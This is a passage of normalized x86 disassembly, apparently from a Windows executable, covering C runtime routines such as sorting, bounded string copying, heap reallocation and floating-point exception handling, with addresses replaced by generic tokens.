movlpd [ esp + 0x4 ] xmm0
fld [ esp + 0x4 ]
add esp 0x10
retn
sub_41af80
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx ecx
jbe r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40a8ab
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push esi
push edi
lea edx [ ecx + eax ]
mov esi eax
mov edx ebx
cmp edi ebx
je r-xdata
jmp r-xdata
sub ebx eax
lea edx [ ecx + eax ]
cmp ebx ecx
ja r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x14 ]
push edi
push esi
call [ r--data ]
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jle r-xdata
mov esi edx
mov edi ecx
cmp esi ebx
ja r-xdata
pop edi
pop esi
sub edi ebx
mov eax [ ebp + 0x10 ]
add esi eax
cmp esi ebx
jbe r-xdata
mov edi esi
mov al [ edx ]
lea edx [ edx + 0x1 ]
mov cl [ edi + edx - 0x1 ]
mov [ edi + edx - 0x1 ] al
mov [ edx - 0x1 ] cl
sub esi 0x1
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
sub_41b020
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
cmp edi eax
je r-xdata
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
pop esi
sub edi eax
lea ebx [ ebx ]
mov cl [ eax ]
lea eax [ eax + 0x1 ]
mov dl [ edi + eax - 0x1 ]
mov [ edi + eax - 0x1 ] cl
mov [ eax - 0x1 ] dl
sub esi 0x1
jne r-xdata
sub_41b060
mov edi edi
push ebp
mov ebp esp
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ebp - 0x104 ] ecx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x100 ] esi
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xfc ] edi
test ecx ecx
jne r-xdata
test edi edi
je r-xdata
test edx edx
je r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40a8ab
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
mov [ ebp - 0x108 ] 0x0
cmp edx 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
retn
dec edx
imul edx edi
push ebx
add edx ecx
shr ebx 0x1
imul ebx edi
add ebx ecx
push ebx
push ecx
mov ecx esi
mov [ ebp - 0x110 ] ebx
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push esi
push edi
push [ ebp - 0xf8 ]
push ecx
call sub_41af80
add esp 0x10
jmp r-xdata
push [ ebp - 0xf8 ]
mov ecx esi
push [ ebp - 0x104 ]
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push edi
push ebx
push [ ebp - 0x104 ]
call sub_41b020
add esp 0xc
mov eax [ ebp - 0x108 ]
sub eax 0x1
mov [ ebp - 0x108 ] eax
js r-xdata
push [ ebp - 0xf8 ]
mov ecx esi
push ebx
call [ r--data ]
call esi
add esp 0x8
test eax eax
jle r-xdata
push edi
push [ ebp - 0xf8 ]
push [ ebp - 0x104 ]
call sub_41b020
add esp 0xc
pop ebx
mov ecx [ ebp + eax * 4 - 0xf4 ]
mov edx [ ebp + eax * 4 - 0x7c ]
mov [ ebp - 0x104 ] ecx
jmp r-xdata
mov eax [ ebp - 0xf8 ]
mov edi eax
mov esi [ ebp - 0x104 ]
mov edx [ ebp - 0xfc ]
mov [ ebp - 0x114 ] eax
nop
push edi
push [ ebp - 0xf8 ]
push ebx
call sub_41b020
add esp 0xc
mov [ ebp - 0xf8 ] edx
mov edi [ ebp - 0x100 ]
add esi edx
mov [ ebp - 0x10c ] esi
cmp esi ebx
jae r-xdata
mov edi [ ebp - 0x114 ]
mov [ ebp - 0x10c ] esi
push ebx
push esi
mov ecx edi
call [ r--data ]
call edi
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
mov eax [ ebp - 0xf8 ]
jle r-xdata
mov eax [ ebp - 0xf8 ]
mov ecx [ ebp - 0x100 ]
push ebx
push esi
call [ r--data ]
call [ ebp - 0x100 ]
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
jle r-xdata
mov edx [ ebp - 0xfc ]
sub edi edx
cmp edi ebx
jbe r-xdata
add esi edx
cmp esi eax
ja r-xdata
cmp ebx esi
ja r-xdata
mov esi [ ebp - 0x10c ]
mov [ ebp - 0x114 ] edi
cmp edi esi
jb r-xdata
push ebx
push edi
mov ecx esi
call [ r--data ]
call esi
add esp 0x8
test eax eax
jg r-xdata
mov esi [ ebp - 0x100 ]
jmp r-xdata
add edi edx
cmp ebx edi
jae r-xdata
mov [ ebp - 0x118 ] edx
mov [ ebp - 0x11c ] edi
cmp esi edi
je r-xdata
mov edx [ ebp - 0xfc ]
mov esi [ ebp - 0x100 ]
lea esp [ esp ]
mov eax [ ebp - 0xf8 ]
cmp ebx edi
jne r-xdata
mov ebx esi
mov edx edi
mov esi [ ebp - 0x118 ]
sub ebx edi
mov esi [ ebp - 0x10c ]
push ebx
push edi
mov ecx esi
call [ r--data ]
call esi
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x100 ]
push ebx
push edi
call [ r--data ]
call [ ebp - 0x100 ]
mov edx [ ebp - 0xfc ]
add esp 0x8
test eax eax
je r-xdata
cmp ebx esi
jbe r-xdata
mov ebx esi
mov [ ebp - 0x110 ] ebx
jmp r-xdata
mov al [ edx ]
lea edx [ edx + 0x1 ]
mov cl [ ebx + edx - 0x1 ]
mov [ ebx + edx - 0x1 ] al
mov [ edx - 0x1 ] cl
sub esi 0x1
jne r-xdata
mov esi [ ebp - 0x10c ]
mov ebx [ ebp - 0x110 ]
mov edx [ ebp - 0xfc ]
cmp esi edx
jae r-xdata
cmp ebx edi
jae r-xdata
sub edi edx
cmp edi [ ebp - 0x104 ]
jbe r-xdata
sub edi edx
cmp edi ebx
jbe r-xdata
cmp ebx edi
jb r-xdata
mov ecx [ ebp - 0x104 ]
mov esi [ ebp - 0x100 ]
cmp ecx edi
jae r-xdata
mov eax [ ebp - 0x108 ]
mov [ ebp + eax * 4 - 0xf4 ] esi
mov [ ebp + eax * 4 - 0x7c ] edx
inc eax
mov [ ebp - 0x108 ] eax
mov edi [ ebp - 0xfc ]
cmp esi edx
jae r-xdata
mov eax [ ebp - 0x108 ]
mov [ ebp + eax * 4 - 0xf4 ] ebx
mov [ ebp + eax * 4 - 0x7c ] edi
inc eax
mov [ ebp - 0x108 ] eax
mov edx [ ebp - 0xf8 ]
mov eax edi
mov ebx [ ebp - 0x104 ]
mov ecx edx
sub ecx esi
sub eax ebx
cmp eax ecx
jl r-xdata
mov edi [ ebp - 0xfc ]
mov edx edi
mov edi [ ebp - 0xfc ]
jmp r-xdata
mov esi [ ebp - 0x100 ]
jmp r-xdata
mov ecx esi
mov esi [ ebp - 0x100 ]
mov [ ebp - 0x104 ] ecx
jmp r-xdata
mov eax edx
xor edx edx
sub eax ecx
div edi
lea ebx [ eax + 0x1 ]
cmp ebx 0x8
ja r-xdata
sub_41b3fa
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
push esi
test edx edx
jne r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
call sub_4135e3
push 0x16
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] ecx
jne r-xdata
test edx edx
jne r-xdata
xor eax eax
jmp r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
mov [ ecx ] dl
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
push ebx
sub esi ecx
mov ebx eax
push edi
mov edi ecx
cmp edx 0xffffffff
jne r-xdata
mov [ ecx ] 0x0
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
mov al [ esi + edi ]
mov [ edi ] al
inc edi
test al al
je r-xdata
test edx edx
mov edx [ ebp + 0x14 ]
jne r-xdata
sub ebx 0x1
je r-xdata
pop edi
test ebx ebx
pop ebx
jne r-xdata
sub ebx 0x1
jne r-xdata
mov [ edi ] 0x0
sub edx 0x1
jne r-xdata
cmp edx 0xffffffff
jne r-xdata
jmp r-xdata
mov [ ecx ] 0x0
call sub_4135e3
push 0x22
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ ecx + eax - 0x1 ] 0x0
pop eax
jmp r-xdata
pop esi
mov [ eax ] esi
call sub_413527
mov eax esi
sub_41b4c0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_41b517
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] esi
jb r-xdata
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
jmp r-xdata
mov esp ebp
pop ebp
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_40ee04
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x8 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
dec esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea ecx [ esi - 0x1 ]
pop esi
mov eax esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax esi
sub eax ecx
and eax 0x1
sub esi eax
movzx eax [ ecx ]
test [ eax + edx + 0x19 ] 0x4
jne r-xdata
dec ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
sub_41b5b3
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_4135e3
mov [ eax ] 0x16
call sub_413527
or eax 0xffffffff
pop ebp
retn
sub_41b5e6
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_411e67
pop ecx
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
push edi
call sub_411e2d
pop ecx
jmp r-xdata
pop edi
pop ebp
retn
push esi
push edi
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
test eax eax
je r-xdata
call sub_4135e3
mov [ eax ] 0xc
xor eax eax
call sub_4117fc
test eax eax
je r-xdata
jmp r-xdata
push esi
call sub_410e54
pop ecx
test eax eax
je r-xdata
pop esi
sub_41b64f
push 0x8
push r--data
call sub_40b2f0
cmp [ rw-data ] 0x1
jl r-xdata
call sub_40b336
retn
mov eax [ ebp + 0x8 ]
test al 0x40
je r-xdata
and eax 0xffffffbf
mov [ ebp + 0x8 ] eax
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_41b6d8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
not ecx
and cx [ ebp - 0x4 ]
and eax [ ebp + 0xc ]
or cx ax
mov [ ebp - 0x8 ] cx
fldcw [ ebp - 0x8 ]
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41b704
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ r--data ]
fistp [ ebp - 0x4 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ r--data ]
fstp [ ebp - 0xc ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ r--data ]
fstp [ ebp - 0xc ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
mov esp ebp
pop ebp
retn
fldpi
fstp [ ebp - 0xc ]
fwait
sub_41b780
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_41b817
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
cmp [ ecx ] al
je r-xdata
pop ebp
retn
cmp eax [ ebp + 0xc ]
je r-xdata
inc eax
cmp [ eax + ecx ] 0x0
jne r-xdata
sub_41b833
mov edi edi
push ebp
mov ebp esp
push esi
call sub_41c4c7
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_41c50a
mov [ esi + 0x4 ] eax
xor eax eax
pop esi
pop ebp
retn
sub_41b850
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
push [ esi ]
call sub_41c5b2
push [ esi + 0x4 ]
call sub_41c632
lea eax [ ebp - 0x8 ]
push eax
call sub_41b833
mov eax [ esi ]
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
inc eax
mov eax [ esi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
xor eax eax
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_41b899
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
push eax
call sub_41b833
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ecx ] edx
or edx 0x1f
push eax
mov [ ebp - 0x8 ] edx
call sub_41b850
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
call sub_41803c
xor eax eax
mov esp ebp
pop ebp
retn
sub_41b8f0
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ esp + 0x4 ]
call sub_41ac05
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_41c6d8
sub_41b930
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0xc
fst [ esp ]
call sub_41ac48
call sub_41b988
add esp 0xc
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_41c6c0
sub_41b988
push edx
fwait
fnstcw [ esp ]
je r-xdata
test eax 0xfffff
jne r-xdata
mov eax [ esp + 0xc ]
cmp [ esp ] 0x27f
je r-xdata
call sub_41abec
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
test eax 0x7ff00000
je r-xdata
fldcw [ r--data ]
cmp [ rw-data ] 0x0
jne r-xdata
and eax 0x80000000
je r-xdata
test eax 0xfffff
jne r-xdata
test eax 0x80000000
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
lea ecx [ r--data ]
mov edx 0x1b
call sub_41ad67
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ r--data ]
mov eax 0x1
jmp r-xdata
test eax 0x80000000
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
fldlg2
fxch st1
fyl2x
pop edx
retn
fldcw [ esp ]
lea ecx [ r--data ]
mov edx 0x1b
jmp r-xdata
jmp r-xdata
fstp st0
fld [ r--data ]
mov eax 0x2
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_41ad67
pop edx
retn
sub_41ba40
cmp [ rw-data ] 0x0
je r-xdata
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi 0xffff
push esi
push 0x1b3f
call sub_41b6d8
fld [ ebp + 0x8 ]
mov ebx eax
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov eax 0x7ff0
and ecx eax
push ecx
push ecx
fstp [ esp ]
cmp cx ax
jne r-xdata
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
call sub_41cef6
fst [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0x8
fucom st1
fnstsw ax
test ah 0x44
jpe r-xdata
call sub_41cd03
dec eax
pop ecx
pop ecx
cmp eax 0x2
ja r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
test bl 0x20
jne r-xdata
push esi
fstp st1
push ebx
fstp st0
call sub_41b6d8
fld [ ebp - 0x8 ]
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
fld [ r--data ]
push ebx
sub esp 0x10
fadd st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x8
jmp r-xdata
push esi
push ebx
call sub_41b6d8
fld [ ebp + 0x8 ]
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
push ebx
sub esp 0x10
fxch st1
fstp [ esp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x10
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_41bb91
add esp 0x1c
movq xmm0 [ esp + 0x4 ]
movapd xmm2 [ r--data ]
movapd xmm1 xmm0
movapd xmm7 xmm0
psrlq xmm0 0x34
movd eax xmm0
andpd xmm0 [ r--data ]
psubd xmm2 xmm0
psrlq xmm1 xmm2
test eax 0x800
je r-xdata
movq xmm0 [ esp + 0x4 ]
psllq xmm1 xmm2
movapd xmm3 xmm0
cmppd xmm0 xmm1 0x6
cmp eax 0x3ff
jl r-xdata
cmp eax 0xbff
jl r-xdata
cmppd xmm3 [ r--data ] 0x6
andpd xmm3 [ r--data ]
movq [ esp + 0x4 ] xmm3
fld [ esp + 0x4 ]
retn
cmp eax 0x432
jg r-xdata
fld [ r--data ]
retn
psllq xmm1 xmm2
cmp eax 0xc32
jg r-xdata
ucomisd xmm7 xmm7
jpo r-xdata
andpd xmm0 [ r--data ]
addsd xmm1 xmm0
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
fld [ esp + 0x4 ]
retn
mov edx 0x3ec
sub esp 0x10
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x14
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_415fd2
add esp 0x10
sub_41bb5d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_41bb91
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebx + 0x20 ]
lea eax [ ebx + 0x18 ]
push edi
push esi
push eax
push [ ebx + 0x8 ]
call sub_41bc5f
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_41bb5d
pop ecx
mov edi eax
call sub_41107d
test al al
je r-xdata
and [ ebp - 0x40 ] 0xfffffffe
push eax
lea eax [ ebx + 0x18 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x20 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_41be62
mov esi [ ebx + 0x20 ]
add esp 0x1c
push edi
call sub_41c153
mov [ esp ] 0xffff
push esi
call sub_41b6d8
fld [ ebx + 0x18 ]
pop ecx
pop ecx
test edi edi
je r-xdata
fld [ ebx + 0x18 ]
push esi
sub esp 0x18
fstp [ esp + 0x10 ]
fldz
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push edi
call sub_41c182
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40a8ab
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_41bc5f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ebx
and esi 0x1f
test bl 0x8
je r-xdata
mov eax ebx
and eax [ ebp + 0x10 ]
test al 0x4
je r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
test bl 0x1
je r-xdata
push 0x4
call sub_41b704
pop ecx
and esi 0xfffffffb
jmp r-xdata
push 0x1
call sub_41b704
pop ecx
and esi 0xfffffff7
jmp r-xdata
test bl 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
test bl 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_41b704
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
mov esp ebp
pop ebp
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
push edi
xor edi edi
test bl 0x10
je r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_41b704
pop ecx
and esi 0xffffffef
mov ecx [ ebp + 0xc ]
fld [ ecx ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
inc edi
fld [ r--data ]
fld [ r--data ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
xor edi edi
inc edi
fld [ ecx ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_41cc00
mov eax [ ebp - 0x4 ]
add esp 0xc
add eax 0xfffffa00
mov [ ebp - 0x4 ] eax
fst [ ebp - 0x10 ]
fldz
cmp eax 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ r--data ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and esi 0xfffffffd
push 0x10
call sub_41b704
pop ecx
fcompp
xor edx edx
fnstsw ax
test ah 0x41
jne r-xdata
xor edi edi
fmulp st1
inc edi
jmp r-xdata
fld [ r--data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
fld [ r--data ]
test ah 0x5
jpo r-xdata
mov eax [ ebp - 0xa ]
mov ecx 0xfffffc03
and eax 0xf
or eax 0x10
mov [ ebp - 0xa ] ax
mov eax [ ebp - 0x4 ]
cmp eax ecx
jge r-xdata
inc edx
mov eax [ ebp + 0xc ]
fstp [ eax ]
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x10 ]
test edx edx
je r-xdata
sub ecx eax
mov eax [ ebp - 0x10 ]
test edi edi
pop edi
je r-xdata
fchs
shr eax 0x1
test [ ebp - 0xc ] 0x1
mov [ ebp - 0x10 ] eax
je r-xdata
test edi edi
jne r-xdata
shr [ ebp - 0xc ] 0x1
sub ecx 0x1
jne r-xdata
or eax 0x80000000
mov [ ebp - 0x10 ] eax
inc edi
test [ ebp - 0x10 ] 0x1
je r-xdata
sub_41be3f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41be62
add esp 0x1c
pop ebp
retn
sub_41be62
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
xor ebx ebx
inc ebx
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push edi
mov edi 0xc000000d
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0x10 ]
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008f
or [ eax + 0x4 ] ebx
test cl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000093
or [ eax + 0x4 ] 0x2
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000091
or [ eax + 0x4 ] 0x4
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008e
or [ eax + 0x4 ] 0x8
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
shl eax 0x4
not eax
xor eax [ ecx + 0x8 ]
and eax 0x10
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
add eax eax
not eax
xor eax [ ecx + 0x8 ]
and eax 0x8
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
shr eax 0x1
not eax
xor eax [ ecx + 0x8 ]
and eax 0x4
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
shr eax 0x3
not eax
xor eax [ ecx + 0x8 ]
and eax 0x2
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
shr eax 0x5
not eax
xor eax [ ecx + 0x8 ]
and eax ebx
xor [ ecx + 0x8 ] eax
call sub_41b75f
mov edx eax
test dl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000090
or [ eax + 0x4 ] 0x10
test dl 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test dl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x8
test dl 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x4
test dl 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffeb
or eax 0x8
cmp eax 0x200
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffd
or eax ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x20 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x20 ] eax
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov ecx [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
mov eax [ ecx + 0x60 ]
